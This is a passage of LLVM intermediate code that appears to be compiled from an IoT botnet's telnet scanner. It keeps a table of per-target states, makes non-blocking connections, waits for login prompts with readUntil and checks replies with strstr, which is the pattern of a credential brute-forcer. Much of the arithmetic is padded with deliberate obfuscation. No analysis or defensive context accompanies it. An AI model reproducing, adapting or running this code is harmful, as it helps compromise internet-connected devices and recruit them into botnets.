  %159 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %160 = getelementptr inbounds [8 x i8], [8 x i8]* %159, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %160, i8 0, i64 8, i32 4, i1 false)
  %161 = load i32, i32* %2, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %162
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %163, i32 0, i32 1
  %165 = load i32, i32* %164, align 4
  %166 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %167 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %166, i32 0, i32 0
  store i32 %165, i32* %167, align 4
  %168 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %169 = load i32, i32* %2, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %170
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %171, i32 0, i32 0
  store i32 %168, i32* %172, align 16
  %173 = load i32, i32* %2, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %174
  %176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %175, i32 0, i32 0
  %177 = load i32, i32* %176, align 16
  %178 = bitcast %struct.timeval* %10 to i8*
  %179 = call i32 @setsockopt(i32 %177, i32 1, i32 20, i8* %178, i32 16) #2
  %180 = load i32, i32* %2, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %181
  %183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %182, i32 0, i32 0
  %184 = load i32, i32* %183, align 16
  %185 = bitcast %struct.timeval* %10 to i8*
  %186 = call i32 @setsockopt(i32 %184, i32 1, i32 21, i8* %185, i32 16) #2
  %187 = load i32, i32* %2, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %188
  %190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %189, i32 0, i32 0
  %191 = load i32, i32* %190, align 16
  %192 = icmp eq i32 %191, -1
  br i1 %192, label %193, label %194

; <label>:193:                                    ; preds = %155
  br label %2316

; <label>:194:                                    ; preds = %155
  %195 = load i32, i32* %2, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %196
  %198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %197, i32 0, i32 0
  %199 = load i32, i32* %198, align 16
  %200 = load i32, i32* %2, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %201
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %202, i32 0, i32 0
  %204 = load i32, i32* %203, align 16
  %205 = call i32 (i32, i32, ...) @fcntl(i32 %204, i32 3, i8* null)
  %206 = and i32 %205, 2048
  %207 = xor i32 %205, 2048
  %208 = or i32 %206, %207
  %209 = or i32 %205, 2048
  %210 = call i32 (i32, i32, ...) @fcntl(i32 %199, i32 4, i32 %208)
  %211 = load i32, i32* %2, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %212
  %214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %213, i32 0, i32 0
  %215 = load i32, i32* %214, align 16
  %216 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %217 = call i32 @connect(i32 %215, %struct.sockaddr* %216, i32 16)
  %218 = icmp eq i32 %217, -1
  br i1 %218, label %219, label %234

; <label>:219:                                    ; preds = %194
  %220 = call i32* @__errno_location() #13
  %221 = load i32, i32* %220, align 4
  %222 = icmp ne i32 %221, 115
  br i1 %222, label %223, label %234

; <label>:223:                                    ; preds = %219
  %224 = load i32, i32* %2, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %225
  %227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %226, i32 0, i32 0
  %228 = load i32, i32* %227, align 16
  %229 = call i32 @sclose(i32 %228)
  %230 = load i32, i32* %2, align 4
  %231 = sext i32 %230 to i64
  %232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %231
  %233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %232, i32 0, i32 3
  store i8 1, i8* %233, align 1
  br label %243

; <label>:234:                                    ; preds = %219, %194
  %235 = load i32, i32* %2, align 4
  %236 = sext i32 %235 to i64
  %237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %236
  %238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %237, i32 0, i32 2
  store i8 1, i8* %238, align 8
  %239 = load i32, i32* %2, align 4
  %240 = sext i32 %239 to i64
  %241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %240
  %242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %241, i32 0, i32 6
  store i32 0, i32* %242, align 4
  br label %243

; <label>:243:                                    ; preds = %234, %223
  br label %2315

; <label>:244:                                    ; preds = %71
  %245 = load i32, i32* %2, align 4
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %246
  %248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %247, i32 0, i32 6
  %249 = load i32, i32* %248, align 4
  %250 = icmp eq i32 %249, 0
  br i1 %250, label %251, label %258

; <label>:251:                                    ; preds = %244
  %252 = call i64 @time(i64* null) #2
  %253 = trunc i64 %252 to i32
  %254 = load i32, i32* %2, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %255
  %257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %256, i32 0, i32 6
  store i32 %253, i32* %257, align 4
  br label %258

; <label>:258:                                    ; preds = %251, %244
  br label %259

; <label>:259:                                    ; preds = %258
  %260 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %261 = getelementptr inbounds [16 x i64], [16 x i64]* %260, i64 0, i64 0
  %262 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %261) #2, !srcloc !6
  %263 = extractvalue { i64, i64* } %262, 0
  %264 = extractvalue { i64, i64* } %262, 1
  %265 = trunc i64 %263 to i32
  store i32 %265, i32* %12, align 4
  %266 = ptrtoint i64* %264 to i64
  %267 = trunc i64 %266 to i32
  store i32 %267, i32* %13, align 4
  br label %268

; <label>:268:                                    ; preds = %259
  br label %269

; <label>:269:                                    ; preds = %268
  %270 = load i32, i32* %2, align 4
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %271
  %273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %272, i32 0, i32 0
  %274 = load i32, i32* %273, align 16
  %275 = srem i32 %274, 64
  %276 = zext i32 %275 to i64
  %277 = shl i64 1, %276
  %278 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %279 = load i32, i32* %2, align 4
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %280
  %282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %281, i32 0, i32 0
  %283 = load i32, i32* %282, align 16
  %284 = sdiv i32 %283, 64
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds [16 x i64], [16 x i64]* %278, i64 0, i64 %285
  %287 = load i64, i64* %286, align 8
  %288 = xor i64 %287, -1
  %289 = xor i64 %277, -1
  %290 = xor i64 7730255416474189173, -1
  %291 = and i64 %288, 7730255416474189173
  %292 = and i64 %287, %290
  %293 = and i64 %289, 7730255416474189173
  %294 = and i64 %277, %290
  %295 = or i64 %291, %292
  %296 = or i64 %293, %294
  %297 = xor i64 %295, %296
  %298 = or i64 %288, %289
  %299 = xor i64 %298, -1
  %300 = or i64 7730255416474189173, %290
  %301 = and i64 %299, %300
  %302 = or i64 %297, %301
  %303 = or i64 %287, %277
  store i64 %302, i64* %286, align 8
  %304 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %304, align 8
  %305 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %305, align 8
  %306 = load i32, i32* %2, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %307
  %309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %308, i32 0, i32 0
  %310 = load i32, i32* %309, align 16
  %311 = sub i32 0, %310
  %312 = sub i32 0, 1
  %313 = add i32 %311, %312
  %314 = sub i32 0, %313
  %315 = add nsw i32 %310, 1
  %316 = call i32 @select(i32 %314, %struct.__sigset_t* null, %struct.__sigset_t* %4, %struct.__sigset_t* null, %struct.timeval* %5)
  store i32 %316, i32* %3, align 4
  %317 = load i32, i32* %3, align 4
  %318 = icmp eq i32 %317, 1
  br i1 %318, label %319, label %383

; <label>:319:                                    ; preds = %269
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %320 = load i32, i32* %2, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %321
  %323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %322, i32 0, i32 0
  %324 = load i32, i32* %323, align 16
  %325 = bitcast i32* %7 to i8*
  %326 = call i32 @getsockopt(i32 %324, i32 1, i32 4, i8* %325, i32* %6) #2
  %327 = load i32, i32* %7, align 4
  %328 = icmp ne i32 %327, 0
  br i1 %328, label %329, label %344

; <label>:329:                                    ; preds = %319
  %330 = load i32, i32* %2, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %331
  %333 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %332, i32 0, i32 0
  %334 = load i32, i32* %333, align 16
  %335 = call i32 @sclose(i32 %334)
  %336 = load i32, i32* %2, align 4
  %337 = sext i32 %336 to i64
  %338 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %337
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %338, i32 0, i32 2
  store i8 0, i8* %339, align 8
  %340 = load i32, i32* %2, align 4
  %341 = sext i32 %340 to i64
  %342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %341
  %343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %342, i32 0, i32 3
  store i8 1, i8* %343, align 1
  br label %382

; <label>:344:                                    ; preds = %319
  %345 = load i32, i32* %2, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %346
  %348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %347, i32 0, i32 0
  %349 = load i32, i32* %348, align 16
  %350 = load i32, i32* %2, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %351
  %353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %352, i32 0, i32 0
  %354 = load i32, i32* %353, align 16
  %355 = call i32 (i32, i32, ...) @fcntl(i32 %354, i32 3, i8* null)
  %356 = xor i32 %355, -1
  %357 = xor i32 -2049, -1
  %358 = xor i32 -2011313341, -1
  %359 = or i32 %356, %357
  %360 = or i32 -2011313341, %358
  %361 = xor i32 %359, -1
  %362 = and i32 %361, %360
  %363 = and i32 %355, -2049
  %364 = call i32 (i32, i32, ...) @fcntl(i32 %349, i32 4, i32 %362)
  %365 = load i32, i32* %2, align 4
  %366 = sext i32 %365 to i64
  %367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %366
  %368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %367, i32 0, i32 6
  store i32 0, i32* %368, align 4
  %369 = load i32, i32* %2, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %370
  %372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %371, i32 0, i32 7
  store i16 0, i16* %372, align 16
  %373 = load i32, i32* %2, align 4
  %374 = sext i32 %373 to i64
  %375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %374
  %376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %375, i32 0, i32 8
  %377 = load i8*, i8** %376, align 8
  call void @llvm.memset.p0i8.i64(i8* %377, i8 0, i64 1024, i32 1, i1 false)
  %378 = load i32, i32* %2, align 4
  %379 = sext i32 %378 to i64
  %380 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %379
  %381 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %380, i32 0, i32 2
  store i8 2, i8* %381, align 8
  br label %2316

; <label>:382:                                    ; preds = %329
  br label %402

; <label>:383:                                    ; preds = %269
  %384 = load i32, i32* %3, align 4
  %385 = icmp eq i32 %384, -1
  br i1 %385, label %386, label %401

; <label>:386:                                    ; preds = %383
  %387 = load i32, i32* %2, align 4
  %388 = sext i32 %387 to i64
  %389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %388
  %390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %389, i32 0, i32 0
  %391 = load i32, i32* %390, align 16
  %392 = call i32 @sclose(i32 %391)
  %393 = load i32, i32* %2, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %394
  %396 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %395, i32 0, i32 2
  store i8 0, i8* %396, align 8
  %397 = load i32, i32* %2, align 4
  %398 = sext i32 %397 to i64
  %399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %398
  %400 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %399, i32 0, i32 3
  store i8 1, i8* %400, align 1
  br label %401

; <label>:401:                                    ; preds = %386, %383
  br label %402

; <label>:402:                                    ; preds = %401, %382
  %403 = load i32, i32* %2, align 4
  %404 = sext i32 %403 to i64
  %405 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %404
  %406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %405, i32 0, i32 6
  %407 = load i32, i32* %406, align 4
  %408 = add i32 %407, 356089943
  %409 = add i32 %408, 10
  %410 = sub i32 %409, 356089943
  %411 = add i32 %407, 10
  %412 = zext i32 %410 to i64
  %413 = call i64 @time(i64* null) #2
  %414 = icmp slt i64 %412, %413
  br i1 %414, label %415, label %430

; <label>:415:                                    ; preds = %402
  %416 = load i32, i32* %2, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %417
  %419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %418, i32 0, i32 0
  %420 = load i32, i32* %419, align 16
  %421 = call i32 @sclose(i32 %420)
  %422 = load i32, i32* %2, align 4
  %423 = sext i32 %422 to i64
  %424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %423
  %425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %424, i32 0, i32 2
  store i8 0, i8* %425, align 8
  %426 = load i32, i32* %2, align 4
  %427 = sext i32 %426 to i64
  %428 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %427
  %429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %428, i32 0, i32 3
  store i8 1, i8* %429, align 1
  br label %430

; <label>:430:                                    ; preds = %415, %402
  br label %2315

; <label>:431:                                    ; preds = %71
  %432 = load i32, i32* %2, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %433
  %435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %434, i32 0, i32 6
  %436 = load i32, i32* %435, align 4
  %437 = icmp eq i32 %436, 0
  br i1 %437, label %438, label %445

; <label>:438:                                    ; preds = %431
  %439 = call i64 @time(i64* null) #2
  %440 = trunc i64 %439 to i32
  %441 = load i32, i32* %2, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %442
  %444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %443, i32 0, i32 6
  store i32 %440, i32* %444, align 4
  br label %445

; <label>:445:                                    ; preds = %438, %431
  %446 = load i32, i32* %2, align 4
  %447 = sext i32 %446 to i64
  %448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %447
  %449 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %448, i32 0, i32 0
  %450 = load i32, i32* %449, align 16
  %451 = load i32, i32* %2, align 4
  %452 = sext i32 %451 to i64
  %453 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %452
  %454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %453, i32 0, i32 8
  %455 = load i8*, i8** %454, align 8
  %456 = load i32, i32* %2, align 4
  %457 = sext i32 %456 to i64
  %458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %457
  %459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %458, i32 0, i32 7
  %460 = load i16, i16* %459, align 16
  %461 = zext i16 %460 to i32
  %462 = call i32 @readUntil(i32 %450, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %455, i32 1024, i32 %461)
  %463 = icmp ne i32 %462, 0
  br i1 %463, label %464, label %496

; <label>:464:                                    ; preds = %445
  %465 = load i32, i32* %2, align 4
  %466 = sext i32 %465 to i64
  %467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %466
  %468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %467, i32 0, i32 6
  store i32 0, i32* %468, align 4
  %469 = load i32, i32* %2, align 4
  %470 = sext i32 %469 to i64
  %471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %470
  %472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %471, i32 0, i32 7
  store i16 0, i16* %472, align 16
  %473 = load i32, i32* %2, align 4
  %474 = sext i32 %473 to i64
  %475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %474
  %476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %475, i32 0, i32 8
  %477 = load i8*, i8** %476, align 8
  %478 = call i8* @strstr(i8* %477, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %479 = icmp ne i8* %478, null
  br i1 %479, label %480, label %485

; <label>:480:                                    ; preds = %464
  %481 = load i32, i32* %2, align 4
  %482 = sext i32 %481 to i64
  %483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %482
  %484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %483, i32 0, i32 2
  store i8 5, i8* %484, align 8
  br label %491

; <label>:485:                                    ; preds = %464
  %486 = load i32, i32* %2, align 4
  %487 = sext i32 %486 to i64
  %488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %487
  %489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %488, i32 0, i32 8
  %490 = load i8*, i8** %489, align 8
  call void @llvm.memset.p0i8.i64(i8* %490, i8 0, i64 1024, i32 1, i1 false)
  br label %491

; <label>:491:                                    ; preds = %485, %480
  %492 = load i32, i32* %2, align 4
  %493 = sext i32 %492 to i64
  %494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %493
  %495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %494, i32 0, i32 2
  store i8 3, i8* %495, align 8
  br label %2316

; <label>:496:                                    ; preds = %445
  %497 = load i32, i32* %2, align 4
  %498 = sext i32 %497 to i64
  %499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %498
  %500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %499, i32 0, i32 0
  %501 = load i32, i32* %500, align 16
  %502 = load i32, i32* %2, align 4
  %503 = sext i32 %502 to i64
  %504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %503
  %505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %504, i32 0, i32 8
  %506 = load i8*, i8** %505, align 8
  %507 = load i32, i32* %2, align 4
  %508 = sext i32 %507 to i64
  %509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %508
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %509, i32 0, i32 7
  %511 = load i16, i16* %510, align 16
  %512 = zext i16 %511 to i32
  %513 = call i32 @readUntil(i32 %501, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %506, i32 1024, i32 %512)
  %514 = icmp ne i32 %513, 0
  br i1 %514, label %515, label %547

; <label>:515:                                    ; preds = %496
  %516 = load i32, i32* %2, align 4
  %517 = sext i32 %516 to i64
  %518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %517
  %519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %518, i32 0, i32 6
  store i32 0, i32* %519, align 4
  %520 = load i32, i32* %2, align 4
  %521 = sext i32 %520 to i64
  %522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %521
  %523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %522, i32 0, i32 7
  store i16 0, i16* %523, align 16
  %524 = load i32, i32* %2, align 4
  %525 = sext i32 %524 to i64
  %526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %525
  %527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %526, i32 0, i32 8
  %528 = load i8*, i8** %527, align 8
  %529 = call i8* @strstr(i8* %528, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %530 = icmp ne i8* %529, null
  br i1 %530, label %531, label %536

; <label>:531:                                    ; preds = %515
  %532 = load i32, i32* %2, align 4
  %533 = sext i32 %532 to i64
  %534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %533
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %534, i32 0, i32 2
  store i8 5, i8* %535, align 8
  br label %542

; <label>:536:                                    ; preds = %515
  %537 = load i32, i32* %2, align 4
  %538 = sext i32 %537 to i64
  %539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %538
  %540 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %539, i32 0, i32 8
  %541 = load i8*, i8** %540, align 8
  call void @llvm.memset.p0i8.i64(i8* %541, i8 0, i64 1024, i32 1, i1 false)
  br label %542

; <label>:542:                                    ; preds = %536, %531
  %543 = load i32, i32* %2, align 4
  %544 = sext i32 %543 to i64
  %545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %544
  %546 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %545, i32 0, i32 2
  store i8 3, i8* %546, align 8
  br label %2316

; <label>:547:                                    ; preds = %496
  %548 = load i32, i32* %2, align 4
  %549 = sext i32 %548 to i64
  %550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %549
  %551 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %550, i32 0, i32 0
  %552 = load i32, i32* %551, align 16
  %553 = load i32, i32* %2, align 4
  %554 = sext i32 %553 to i64
  %555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %554
  %556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %555, i32 0, i32 8
  %557 = load i8*, i8** %556, align 8
  %558 = load i32, i32* %2, align 4
  %559 = sext i32 %558 to i64
  %560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %559
  %561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %560, i32 0, i32 7
  %562 = load i16, i16* %561, align 16
  %563 = zext i16 %562 to i32
  %564 = call i32 @readUntil(i32 %552, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.59, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %557, i32 1024, i32 %563)
  %565 = icmp ne i32 %564, 0
  br i1 %565, label %566, label %598

; <label>:566:                                    ; preds = %547
  %567 = load i32, i32* %2, align 4
  %568 = sext i32 %567 to i64
  %569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %568
  %570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %569, i32 0, i32 6
  store i32 0, i32* %570, align 4
  %571 = load i32, i32* %2, align 4
  %572 = sext i32 %571 to i64
  %573 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %572
  %574 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %573, i32 0, i32 7
  store i16 0, i16* %574, align 16
  %575 = load i32, i32* %2, align 4
  %576 = sext i32 %575 to i64
  %577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %576
  %578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %577, i32 0, i32 8
  %579 = load i8*, i8** %578, align 8
  %580 = call i8* @strstr(i8* %579, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %581 = icmp ne i8* %580, null
  br i1 %581, label %582, label %587

; <label>:582:                                    ; preds = %566
  %583 = load i32, i32* %2, align 4
  %584 = sext i32 %583 to i64
  %585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %584
  %586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %585, i32 0, i32 2
  store i8 5, i8* %586, align 8
  br label %593

; <label>:587:                                    ; preds = %566
  %588 = load i32, i32* %2, align 4
  %589 = sext i32 %588 to i64
  %590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %589
  %591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %590, i32 0, i32 8
  %592 = load i8*, i8** %591, align 8
  call void @llvm.memset.p0i8.i64(i8* %592, i8 0, i64 1024, i32 1, i1 false)
  br label %593

; <label>:593:                                    ; preds = %587, %582
  %594 = load i32, i32* %2, align 4
  %595 = sext i32 %594 to i64
  %596 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %595
  %597 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %596, i32 0, i32 2
  store i8 3, i8* %597, align 8
  br label %2316

; <label>:598:                                    ; preds = %547
  %599 = load i32, i32* %2, align 4
  %600 = sext i32 %599 to i64
  %601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %600
  %602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %601, i32 0, i32 0
  %603 = load i32, i32* %602, align 16
  %604 = load i32, i32* %2, align 4
  %605 = sext i32 %604 to i64
  %606 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %605
  %607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %606, i32 0, i32 8
  %608 = load i8*, i8** %607, align 8
  %609 = load i32, i32* %2, align 4
  %610 = sext i32 %609 to i64
  %611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %610
  %612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %611, i32 0, i32 7
  %613 = load i16, i16* %612, align 16
  %614 = zext i16 %613 to i32
  %615 = call i32 @readUntil(i32 %603, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %608, i32 1024, i32 %614)
  %616 = icmp ne i32 %615, 0
  br i1 %616, label %617, label %649

; <label>:617:                                    ; preds = %598
  %618 = load i32, i32* %2, align 4
  %619 = sext i32 %618 to i64
  %620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %619
  %621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %620, i32 0, i32 6
  store i32 0, i32* %621, align 4
  %622 = load i32, i32* %2, align 4
  %623 = sext i32 %622 to i64
  %624 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %623
  %625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %624, i32 0, i32 7
  store i16 0, i16* %625, align 16
  %626 = load i32, i32* %2, align 4
  %627 = sext i32 %626 to i64
  %628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %627
  %629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %628, i32 0, i32 8
  %630 = load i8*, i8** %629, align 8
  %631 = call i8* @strstr(i8* %630, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %632 = icmp ne i8* %631, null
  br i1 %632, label %633, label %638

; <label>:633:                                    ; preds = %617
  %634 = load i32, i32* %2, align 4
  %635 = sext i32 %634 to i64
  %636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %635
  %637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %636, i32 0, i32 2
  store i8 5, i8* %637, align 8
  br label %644

